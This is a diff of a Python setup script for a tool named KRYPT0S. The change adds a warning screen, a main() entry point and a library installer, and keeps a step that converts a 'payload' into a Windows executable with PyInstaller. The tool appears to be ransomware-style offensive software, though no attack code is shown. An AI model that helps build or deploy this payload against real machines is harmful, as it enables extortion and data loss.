@@ -30,7 +30,7 @@ def check_os():
         
         exit()
         
-    print("[✔] Running windows OS \n")
+    print(f"[\u2714] You are running script on a Windows OS \n")
     
 def download_library(libraries):
     print("[*] Checking and downloading required PIP libraries")
@@ -46,11 +46,11 @@ def download_library(libraries):
         except Exception as err:
             print(f"[-] Unable to install {library}! Error: {err}. Skipping...")
             
-def libraries_check_section(libraries):
+def libraries_check_section():
+    libraries = ["pycryptodome", "requests", "pywin32", "pyinstaller"]
+    
     print("PIP LIBRARY INSTALLATION - Downloading required libraries . . . \n")
-
     download_library(libraries)
-
     print("\nLIBRARY INSTALLATION COMPLETED\n")
 
 def payload_conversion():
@@ -145,7 +145,7 @@ def clean_pyinstaller_artifacts(executable_name):
     print() # New line
 
 def banner():
-    print("""
+    print(r"""
          _  ________   _______ ____   ___  ____    ____  _____ _____ _   _ ____  
         | |/ /  _ \ \ / /_   _|  _ \ / _ \/ ___|  / ___|| ____|_   _| | | |  _ \ 
         | ' /| |_) \ V /  | | | |_) | | | \___ \  \___ \|  _|   | | | | | | |_) |
@@ -153,13 +153,38 @@ def banner():
      ___|_|\_\_| \_\|_|   |_| |_|    \___/|____/  |____/|_____| |_|  \___/|_|   
                           ---- Still undergoing testing, may encounter issues
     """)
+    
+def clear_screen():
+    try:
+        os.system("cls")
+    except:
+       pass
 
-banner()    
-check_os()
+def warning_message():
+    clear_screen() # Remove above clutter
+    print("!WARNING! Before continuing, please ensure the following: \n")
+    print("1) You have the necessary permissions for basic installation tasks.")
+    print("2) You have NOT renamed the KRYPT0S Python file or the Screen Python file. The setup file will allow you to do this.")
+    print("3) The setup file is in the same directory as Screen.py and _KRYPT0S.py.")
+    print("4) You are using a Windows operating system.")
+    
+    input("\nPress any key to continue if you agree to the above ... ")
+    
+    clear_screen() # Remove warning message
+    banner() # Show banner after
 
-libraries = ["pycryptodome", "requests", "pywin32", "pyinstaller"]
-libraries_check_section(libraries)
+def main():
+    # Show warning message
+    warning_message()
 
-payload_conversion()
+    # Check OS to see if it is Windows or not
+    check_os()
 
-# Use ethically!
+    # Install required libraries needed
+    libraries_check_section()
+
+    # Start payload conversion
+    payload_conversion()
+
+if __name__ == '__main__':
+    main()
